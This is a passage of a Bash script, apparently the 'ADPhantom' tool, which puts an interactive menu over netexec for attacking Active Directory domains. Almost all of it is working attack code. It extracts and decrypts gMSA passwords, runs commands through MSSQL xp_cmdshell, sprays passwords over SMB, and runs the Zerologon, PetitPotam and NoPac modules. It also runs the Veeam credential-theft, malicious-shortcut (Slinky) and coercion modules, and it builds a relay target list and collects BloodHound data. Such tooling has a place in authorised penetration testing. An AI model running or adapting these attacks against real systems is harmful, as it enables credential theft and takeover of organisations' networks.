    log_section "Tombstone (Deleted Objects) | Target: $TARGET"
    echo -e "\n${GREEN}=== Tombstone — Deleted AD Objects ===${NC}"
    echo -e "${CYAN}[i] ดึง object ที่ถูกลบแต่ยังอยู่ใน tombstone window (default 180 วัน)${NC}\n"

    echo "Select tombstone query:"
    echo "1) 🪦 Deleted Users ทั้งหมด"
    echo "2) 🖥️  Deleted Computers ทั้งหมด"
    echo "3) 👥 Deleted Groups ทั้งหมด"
    echo "4) 🔍 Deleted Objects ทั้งหมด (ทุก objectClass)"
    echo "5) 🔎 Custom filter + tombstone"
    echo "6) 🔄 รันทั้งหมด (Users + Computers + Groups)"
    echo "7) 🔙 Back"
    read -p "Choice [1-7]: " ts_choice

    local ts_attrs="sAMAccountName,distinguishedName,lastKnownParent,whenChanged,isDeleted"

    case $ts_choice in
        1)
            echo -e "\n${YELLOW}[*] Querying deleted users:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                --query "(&(isDeleted=TRUE)(objectClass=user))" "$ts_attrs" --tombstone
            ;;
        2)
            echo -e "\n${YELLOW}[*] Querying deleted computers:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                --query "(&(isDeleted=TRUE)(objectClass=computer))" "$ts_attrs" --tombstone
            ;;
        3)
            echo -e "\n${YELLOW}[*] Querying deleted groups:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                --query "(&(isDeleted=TRUE)(objectClass=group))" "$ts_attrs" --tombstone
            ;;
        4)
            echo -e "\n${YELLOW}[*] Querying all deleted objects:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                --query "(isDeleted=TRUE)" "$ts_attrs" --tombstone
            ;;
        5)
            echo -e "${CYAN}Example: (&(isDeleted=TRUE)(sAMAccountName=admin*))${NC}"
            read -p "Enter LDAP filter (isDeleted=TRUE จะถูกใส่ให้อัตโนมัติถ้าไม่ใส่): " ts_filter
            read -p "Enter attributes (default: $ts_attrs): " ts_custom_attrs
            [ -z "$ts_custom_attrs" ] && ts_custom_attrs="$ts_attrs"
            [[ "$ts_filter" != *"isDeleted"* ]] && ts_filter="(&(isDeleted=TRUE)${ts_filter})"
            echo -e "\n${YELLOW}[*] Running tombstone query: $ts_filter${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                --query "$ts_filter" "$ts_custom_attrs" --tombstone
            ;;
        6)
            run_tombstone_auto
            ;;
        7)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
}

# Function for advanced LDAP queries
run_advanced_ldap() {
    log_section "Advanced LDAP Queries | Target: $TARGET"
    echo -e "\n${GREEN}=== Advanced LDAP Queries ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for advanced LDAP queries${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select advanced LDAP query:"
    echo "1) 🔍 Find Delegation Relationships"
    echo "2) 👑 Trusted for Delegation Users/Computers"
    echo "3) 🔓 Password Not Required Users"
    echo "4) 📊 Admin Count = 1 Users"
    echo "5) 👥 Enumerate Domain Users"
    echo "6) 📤 Export Users to File"
    echo "7) 📁 Set Custom Base DN"
    echo "8) 🔎 Custom LDAP Query"
    echo "9) 🪦 Tombstone (Deleted Objects)"
    echo "10) 🔙 Back to main menu"
    read -p "Choice [1-10]: " ldap_choice

    case $ldap_choice in
        1)
            echo -e "\n${YELLOW}[*] Finding delegation relationships:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --find-delegation
            ;;
        2)
            echo -e "\n${YELLOW}[*] Users and computers trusted for delegation:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --trusted-for-delegation
            ;;
        3)
            echo -e "\n${YELLOW}[*] Users with PASSWD_NOTREQD flag:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --password-not-required
            ;;
        4)
            echo -e "\n${YELLOW}[*] Users with adminCount=1 (privileged users):${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --admin-count
            ;;
        5)
            echo -e "\n${YELLOW}[*] Enumerating domain users:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users
            ;;
        6)
            echo -e "\n${YELLOW}[*] Export users to file${NC}"
            read -p "Enter output filename (default: users_${TARGET}.txt): " user_export
            if [ -z "$user_export" ]; then
                user_export="users_${TARGET}.txt"
            fi
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users-export "$user_export"
            echo -e "${GREEN}[+] Users exported to: $user_export${NC}"
            ;;
        7)
            echo -e "\n${YELLOW}[*] Set custom Base DN${NC}"
            echo -e "${CYAN}Example: DC=domain,DC=com${NC}"
            read -p "Enter Base DN: " base_dn
            echo -e "\n${YELLOW}[*] Testing with custom Base DN:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --base-dn "$base_dn" --users
            ;;
        8)
            echo -e "\n${YELLOW}[*] Custom LDAP Query${NC}"
            echo -e "${CYAN}Example filters:${NC}"
            echo "  - (objectClass=user)"
            echo "  - (&(objectClass=user)(adminCount=1))"
            echo "  - (servicePrincipalName=*/*)"
            echo "  - (objectClass=computer)"
            echo ""
            read -p "Enter LDAP filter: " ldap_filter
            read -p "Enter attributes to return (comma-separated, default: *): " ldap_attrs
            if [ -z "$ldap_attrs" ]; then
                ldap_attrs="*"
            fi

            echo -e "\n${YELLOW}[*] Running custom query:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --query "$ldap_filter" "$ldap_attrs"
            ;;
        9)
            run_tombstone
            ;;
        10)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac

    read -p "Press Enter to continue..."
}

# Function for gMSA operations
run_gmsa_ops() {
    log_section "gMSA Operations | Target: $TARGET"
    echo -e "\n${GREEN}=== gMSA Operations (Group Managed Service Accounts) ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for gMSA operations${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select gMSA operation:"
    echo "1) 📋 List all gMSA accounts"
    echo "2) 🔑 Convert gMSA ID to password hash"
    echo "3) 🔓 Decrypt gMSA password from LSA"
    echo "4) 🎯 Extract gMSA passwords (all methods)"
    echo "5) 🔙 Back to main menu"
    read -p "Choice [1-5]: " gmsa_choice
    
    case $gmsa_choice in
        1)
            echo -e "\n${YELLOW}[*] Listing all gMSA accounts:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa
            ;;
        2)
            echo -e "\n${YELLOW}[*] Convert gMSA ID to password hash${NC}"
            read -p "Enter gMSA account ID: " gmsa_id
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_id"
            ;;
        3)
            echo -e "\n${YELLOW}[*] Decrypt gMSA password from LSA${NC}"
            read -p "Enter gMSA account name: " gmsa_account
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_account"
            ;;
        4)
            echo -e "\n${YELLOW}[*] Extracting all gMSA passwords...${NC}"
            
            # First list all gMSA accounts
            echo -e "\n${CYAN}Step 1: Listing gMSA accounts${NC}"
            gmsa_output=$(nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa 2>&1)
            echo "$gmsa_output"
            
            # Extract gMSA IDs and try to convert them
            echo -e "\n${CYAN}Step 2: Attempting to convert gMSA IDs${NC}"
            echo "$gmsa_output" | grep -o "S-[0-9-]\+" | while read -r gmsa_sid; do
                if [ ! -z "$gmsa_sid" ]; then
                    echo -e "\n${YELLOW}[*] Converting SID: $gmsa_sid${NC}"
                    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_sid"
                fi
            done
            
            # Try to decrypt from LSA if we have admin rights
            echo -e "\n${CYAN}Step 3: Attempting LSA decryption (requires admin)${NC}"
            echo "$gmsa_output" | grep -i "cn=" | grep -o "CN=[^,]*" | cut -d'=' -f2 | while read -r gmsa_name; do
                if [ ! -z "$gmsa_name" ]; then
                    echo -e "\n${YELLOW}[*] Attempting LSA decryption for: $gmsa_name${NC}"
                    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_name"
                fi
            done
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run MSSQL enumeration
run_mssql_enum() {
    log_section "MSSQL Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running MSSQL Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for MSSQL enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    ask_skip "MSSQL Authentication" || \
        nxcrun mssql "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH

    if ! ask_skip "xp_cmdshell — Execute Command"; then
        read -p "Enter command to execute: " cmd
        [ -n "$cmd" ] && nxcrun mssql "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH -x "$cmd"
    fi

    read -p "Press Enter to continue..."
}

# Function to run FTP enumeration
run_ftp_enum() {
    log_section "FTP Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running FTP Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for FTP enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    ask_skip "FTP Directory Listing (root)" || \
        nxcrun ftp "$TARGET" $USER_OPT $AUTH_CRED --ls

    if ! ask_skip "FTP Specific Directory Listing"; then
        read -p "Enter directory path: " ftp_dir
        [ -n "$ftp_dir" ] && nxcrun ftp "$TARGET" $USER_OPT $AUTH_CRED --ls "$ftp_dir"
    fi

    read -p "Press Enter to continue..."
}

# Function to run vulnerability checks
run_vuln_check() {
    log_section "Vulnerability Checks | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Vulnerability Checks ===${NC}"
    
    echo "Select vulnerability to check:"
    echo "1) Zerologon"
    echo "2) Petitpotam"
    echo "3) NoPac"
    echo "4) All"
    read -p "Choice [1-4]: " vuln_choice
    
    case $vuln_choice in
        1)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
            ;;
        2)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
            ;;
        3)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
            ;;
        4)
            ask_skip "Zerologon" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
            ask_skip "PetitPotam" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
            ask_skip "NoPac" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run useful modules
run_modules() {
    log_section "Useful Modules | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Useful Modules ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for modules${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select module:"
    echo "1) Webdav (Check WebClient)"
    echo "2) Veeam (Extract credentials)"
    echo "3) Slinky (Create malicious shortcuts)"
    echo "4) Coerce_plus (Check coercion vulns)"
    echo "5) Enum_AV (Enumerate Antivirus)"
    echo "6) Run all"
    read -p "Choice [1-6]: " module_choice
    
    case $module_choice in
        1)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
            ;;
        2)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
            ;;
        3)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M slinky
            ;;
        4)
            read -p "Enter listener IP (tun0 IP): " listener_ip
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M coerce_plus -o LISTENER=$listener_ip
            ;;
        5)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
            ;;
        6)
            ask_skip "WebDAV" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
            ask_skip "Veeam" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
            ask_skip "Enum_AV" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run password spraying
run_spray() {
    log_section "Password Spraying | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Password Spraying ===${NC}"
    
    echo "Password spraying options:"
    echo "1) Single password with userlist"
    echo "2) Password list with userlist"
    read -p "Choice [1-2]: " spray_choice
    
    case $spray_choice in
        1)
            read -p "Enter path to userlist file: " userlist
            read -p "Enter password to spray: " spray_pass
            nxcrun smb "$TARGET" -u "$userlist" -p "$spray_pass" $DOMAIN_OPTION --continue-on-success
            ;;
        2)
            read -p "Enter path to userlist file: " userlist
            read -p "Enter path to password list: " passlist
            nxcrun smb "$TARGET" -u "$userlist" -p "$passlist" $DOMAIN_OPTION --no-bruteforce --continue-on-success
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run all enumeration
run_all() {
    echo -e "\n${GREEN}=== Running All Enumeration ===${NC}"
    echo -e "${RED}[!] This will take a very long time...${NC}"
    echo -e "${YELLOW}[!] Make sure you have proper authorization${NC}"
    
    ask_skip "Authentication Tests" || run_auth
    ask_skip "Basic Enumeration" || run_basic_enum

    if [ "$USERNAME" != "''" ]; then
        ask_skip "SMB Enumeration" || run_smb_enum
        ask_skip "LDAP Enumeration" || run_ldap_enum
        ask_skip "Credential Dumping (Advanced)" || run_cred_dump_advanced
        ask_skip "Vulnerability Checking" || run_vuln_check
        ask_skip "Useful Modules" || run_modules
        ask_skip "gMSA Operations" || run_gmsa_ops
        ask_skip "Advanced LDAP Queries" || run_advanced_ldap
        ask_skip "Tombstone — Deleted AD Objects (Users/Computers/Groups)" || run_tombstone_auto
        ask_skip "Advanced Mapping & Enumeration" || run_mapping_enum
        ask_skip "Hash Checking" || run_hash_check
        ask_skip "Generate Hosts / Export Users & Computers" || run_export
    fi

    echo -e "\n${GREEN}[+] All enumeration completed!${NC}"
    echo -e "\n${PURPLE}════════════════════════════════════════${NC}"
    echo -e "${PURPLE}  🩸 Running BloodHound Collection...${NC}"
    echo -e "${PURPLE}════════════════════════════════════════${NC}"
    run_bloodhound

    read -p "Press Enter to continue..."
}

# Function to change target/credentials
change_settings() {
    get_target
    get_credentials
}

# BloodHound collection via netexec LDAP — output ZIP
run_bloodhound() {
    log_section "BloodHound Collection | Target: $TARGET"
    echo -e "\n${GREEN}=== BloodHound Collection (ZIP) ===${NC}"

    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for BloodHound collection${NC}"
        read -p "Press Enter to continue..."
        return
    fi

    echo -e "${CYAN}Collection methods:${NC}"
    echo "1) All          — ทุก method (ช้าสุด)"
    echo "2) Default      — Group, LocalAdmin, Session, Trusts"
    echo "3) DCOnly       — จาก DC เท่านั้น (เร็ว, stealthy)"
    echo "4) Session      — Active sessions only"
    echo "5) Acl          — ACL/ACE entries"
    echo "6) Trusts       — Domain trusts"
    echo "7) Custom       — พิมพ์เอง"
    read -p "Choice [1-7]: " bh_choice

    case $bh_choice in
        1) bh_collection="All" ;;
        2) bh_collection="Default" ;;
        3) bh_collection="DCOnly" ;;
        4) bh_collection="Session" ;;
        5) bh_collection="Acl" ;;
        6) bh_collection="Trusts" ;;
        7) read -p "Enter collection methods (comma-separated): " bh_collection ;;
        *) echo -e "${RED}Invalid choice${NC}"; read -p "Press Enter..."; return ;;
    esac

    local bh_out="$LOG_DIR/bloodhound_${TARGET}_${TIMESTAMP}"
    mkdir -p "$bh_out"

    echo -e "\n${YELLOW}[*] Collecting BloodHound data (method: $bh_collection)...${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
        --bloodhound --collection "$bh_collection" --dns-tcp

    # zip ไฟล์ json ทั้งหมดที่ netexec สร้างใน working dir
    local json_files
    json_files=$(find . -maxdepth 1 -name "*.json" -newer "$LOG_FILE" 2>/dev/null)
    if [ -n "$json_files" ]; then
        local zip_path="$LOG_DIR/bloodhound_${TARGET}_${TIMESTAMP}.zip"
        echo "$json_files" | xargs zip -j "$zip_path" 2>/dev/null
        echo "$json_files" | xargs rm -f 2>/dev/null
        echo -e "${GREEN}[+] BloodHound ZIP: ${CYAN}$zip_path${NC}"
    else
        # netexec บางเวอร์ชัน zip ให้เลย
        local existing_zip
        existing_zip=$(find . -maxdepth 1 -name "*bloodhound*.zip" -newer "$LOG_FILE" 2>/dev/null | head -1)
        if [ -n "$existing_zip" ]; then
            mv "$existing_zip" "$LOG_DIR/"
            echo -e "${GREEN}[+] BloodHound ZIP: ${CYAN}$LOG_DIR/$(basename "$existing_zip")${NC}"
        else
            echo -e "${YELLOW}[!] ไม่พบไฟล์ output — ตรวจสอบ netexec version หรือ permissions${NC}"
        fi
    fi

    read -p "Press Enter to continue..."
}

# Generate host list / export users
run_export() {
    log_section "Generate Hosts / Export Users | Target: $TARGET"
    echo -e "\n${GREEN}=== Generate Hosts / Export Users ===${NC}"

    echo "Select export type:"
    echo "1) 🖥️  Generate Relay Host List (SMB Signing disabled)"
    echo "2) 👥 Export Domain Users → TXT (LDAP)"
    echo "3) 🖥️  Export Domain Computers → TXT (LDAP)"
    echo "4) 📋 Export All (hosts + users + computers)"
    echo "5) 🔙 Back"
    read -p "Choice [1-5]: " exp_choice

    local out_hosts="$LOG_DIR/hosts_${TARGET}_${TIMESTAMP}.txt"
    local out_users="$LOG_DIR/users_${TARGET}_${TIMESTAMP}.txt"
    local out_computers="$LOG_DIR/computers_${TARGET}_${TIMESTAMP}.txt"

    case $exp_choice in
        1)
            echo -e "\n${YELLOW}[*] Generating relay host list (no SMB signing):${NC}"
            nxcrun smb "$TARGET" --gen-relay-list "$out_hosts"
            echo -e "${GREEN}[+] Hosts saved: ${CYAN}$out_hosts${NC}"
            ;;
        2)
            if [ "$USERNAME" == "''" ]; then
                echo -e "${RED}[!] Need credentials${NC}"
                read -p "Press Enter..."; return
            fi
            echo -e "\n${YELLOW}[*] Exporting domain users:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                --users-export "$out_users"
            echo -e "${GREEN}[+] Users saved: ${CYAN}$out_users${NC}"
            ;;
        3)
            if [ "$USERNAME" == "''" ]; then
                echo -e "${RED}[!] Need credentials${NC}"
                read -p "Press Enter..."; return
            fi
            echo -e "\n${YELLOW}[*] Exporting domain computers:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                --computers "$out_computers"
            echo -e "${GREEN}[+] Computers saved: ${CYAN}$out_computers${NC}"
            ;;
        4)
            echo -e "\n${YELLOW}[*] Generating relay host list:${NC}"
            nxcrun smb "$TARGET" --gen-relay-list "$out_hosts"
            echo -e "${GREEN}[+] Hosts: ${CYAN}$out_hosts${NC}"

            if [ "$USERNAME" != "''" ]; then
                echo -e "\n${YELLOW}[*] Exporting domain users:${NC}"
                nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                    --users-export "$out_users"
                echo -e "${GREEN}[+] Users: ${CYAN}$out_users${NC}"

                echo -e "\n${YELLOW}[*] Exporting domain computers:${NC}"
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
                    --computers "$out_computers"
                echo -e "${GREEN}[+] Computers: ${CYAN}$out_computers${NC}"
            else
                echo -e "${YELLOW}[!] ข้าม users/computers export — ไม่มี credentials${NC}"
            fi
            ;;
        5) return ;;
        *) echo -e "${RED}Invalid choice${NC}" ;;
    esac

    read -p "Press Enter to continue..."
}

# Generate TXT and HTML reports from session log
generate_report() {
    local end_time
    end_time=$(date '+%Y-%m-%d %H:%M:%S')
    local start_time
    start_time=$(grep "SESSION_START=" "$LOG_FILE" | cut -d= -f2)
    local cmd_count
    cmd_count=$(grep -c "^\[.*\] CMD:" "$LOG_FILE" 2>/dev/null || echo 0)

    echo -e "\n${CYAN}[*] Generating reports...${NC}"

    # ── TXT Report ──────────────────────────────────────────────
    {
        echo "========================================================"
        echo "  ADPhantom — Session Report"
        echo "========================================================"
        echo "  Target   : $TARGET"
        echo "  Username : $USERNAME"
        echo "  Domain   : ${DOMAIN:-Not set}"
        echo "  Start    : $start_time"
        echo "  End      : $end_time"
        echo "  Commands : $cmd_count"
        echo "  Log file : $LOG_FILE"
        echo "========================================================"
        echo ""
        # Print each command block
        while IFS= read -r line; do
            if [[ "$line" =~ ^\[.*\]\ CMD: ]]; then
                echo ""
                echo "──────────────────────────────────────────────────────"
                echo "  $line"
                echo "──────────────────────────────────────────────────────"
            elif [[ "$line" =~ ^════ ]]; then
                echo ""
                echo "$line"
            else
                echo "$line"
            fi
        done < <(grep -v "^SESSION_START\|^HOSTNAME\|^USER_RUNNING" "$LOG_FILE")
        echo ""
        echo "========================================================"
        echo "  End of Report"
        echo "========================================================"
    } > "$REPORT_TXT"

    # ── HTML Report ──────────────────────────────────────────────
    {
        cat <<HTMLEOF
<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<title>ADPhantom Report — $TARGET</title>
<style>
  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--accent:#58a6ff;
        --green:#3fb950;--yellow:#d29922;--red:#f85149;--cyan:#39c5cf;
        --text:#c9d1d9;--muted:#8b949e;}
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:var(--bg);color:var(--text);font-family:'Cascadia Code','Fira Code',monospace;
       font-size:13px;line-height:1.6;padding:24px}
  header{background:var(--surface);border:1px solid var(--border);border-radius:8px;
         padding:24px 28px;margin-bottom:20px}
  header h1{font-size:22px;color:var(--accent);margin-bottom:6px}
  .meta{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px}
  .meta-item{background:#21262d;border-radius:6px;padding:8px 12px;font-size:12px}
  .meta-item span{color:var(--muted);display:block;font-size:10px;text-transform:uppercase;
                  letter-spacing:.5px;margin-bottom:2px}
  .section{background:var(--surface);border:1px solid var(--border);border-radius:8px;
           margin-bottom:12px;overflow:hidden}
  .section-header{background:#21262d;padding:8px 16px;font-size:11px;
                  color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:.5px}
  .cmd-block{border-bottom:1px solid var(--border);padding:10px 16px}
  .cmd-block:last-child{border-bottom:none}
  .cmd-line{color:var(--yellow);font-weight:600;margin-bottom:6px;font-size:12px}
  .cmd-line::before{content:"$ ";color:var(--green)}
  .output{color:var(--text);white-space:pre-wrap;word-break:break-all;
          font-size:11.5px;padding-left:16px;border-left:2px solid var(--border)}
  .no-output{color:var(--muted);font-size:11px;padding-left:16px;font-style:italic}
  footer{margin-top:20px;text-align:center;color:var(--muted);font-size:11px}
</style>
</head>
<body>
<header>
  <h1>ADPhantom — Session Report</h1>
  <div class="meta">
    <div class="meta-item"><span>Target</span>$TARGET</div>
    <div class="meta-item"><span>Username</span>${USERNAME}</div>
    <div class="meta-item"><span>Domain</span>${DOMAIN:-Not set}</div>
    <div class="meta-item"><span>Start</span>$start_time</div>
    <div class="meta-item"><span>End</span>$end_time</div>
    <div class="meta-item"><span>Commands Run</span>$cmd_count</div>
  </div>
</header>
HTMLEOF

        # Parse log into HTML sections
        current_section=""
        in_cmd=0
        cmd_text=""
        output_lines=()

        flush_cmd() {
            if [ -n "$cmd_text" ]; then
                echo '<div class="cmd-block">'
                echo "<div class=\"cmd-line\">$(printf '%s' "$cmd_text" | sed 's/.*CMD: //' | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
                if [ ${#output_lines[@]} -gt 0 ]; then
                    echo '<div class="output">'
                    for ol in "${output_lines[@]}"; do
                        printf '%s\n' "$ol" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g'
                    done
                    echo '</div>'
                else
                    echo '<div class="no-output">(no output captured)</div>'
                fi
                echo '</div>'
                cmd_text=""
                output_lines=()
            fi
        }

        while IFS= read -r line; do
            if [[ "$line" =~ ^SESSION_START|^HOSTNAME|^USER_RUNNING ]]; then
                continue
            elif [[ "$line" =~ ^════ ]]; then
                continue
            elif [[ "$line" =~ ^\ \ (.+)\ \|\ Target ]]; then
                flush_cmd
                if [ -n "$current_section" ]; then echo '</div>'; fi
                section_name="${BASH_REMATCH[1]}"
                current_section="$section_name"
                echo '<div class="section">'
                echo "<div class=\"section-header\">$section_name</div>"
            elif [[ "$line" =~ ^\[.*\]\ CMD:\ (.*) ]]; then
                flush_cmd
                cmd_text="$line"
            elif [ -n "$cmd_text" ]; then
                output_lines+=("$line")
            fi
        done < "$LOG_FILE"

        flush_cmd
        if [ -n "$current_section" ]; then echo '</div>'; fi

        echo '<footer>ADPhantom v4.0 &mdash; Report generated '"$end_time"'</footer>'
        echo '</body></html>'
    } > "$REPORT_HTML"

    echo -e "${GREEN}[+] Reports saved:${NC}"
    echo -e "    TXT  : ${CYAN}$REPORT_TXT${NC}"
    echo -e "    HTML : ${CYAN}$REPORT_HTML${NC}"
    echo -e "    LOG  : ${CYAN}$LOG_FILE${NC}"
}

# Main loop
while true; do
    print_banner
    
    # Check if target is set
    if [ -z "$TARGET" ]; then
        get_target
        get_credentials
    fi
    
    show_menu
    
    case $choice in
        1) run_auth ;;
        2) run_basic_enum ;;
        3) run_smb_enum ;;
        4) run_ldap_enum ;;
        5) run_mssql_enum ;;
        6) run_ftp_enum ;;
        7) run_cred_dump_advanced ;;
        8) run_vuln_check ;;
        9) run_modules ;;
        10) run_spray ;;
        11) run_mapping_enum ;;
        12) run_all ;;
        13) change_settings ;;
        14) run_gmsa_ops ;;
        15) run_advanced_ldap ;;
        16) run_hash_check ;;
        17) run_bloodhound ;;
        18) run_export ;;
        0)
            generate_report
            echo -e "${GREEN}Goodbye!${NC}"
            exit 0
            ;;
        *) 
            echo -e "${RED}Invalid option${NC}"
            sleep 1
            ;;
    esac
done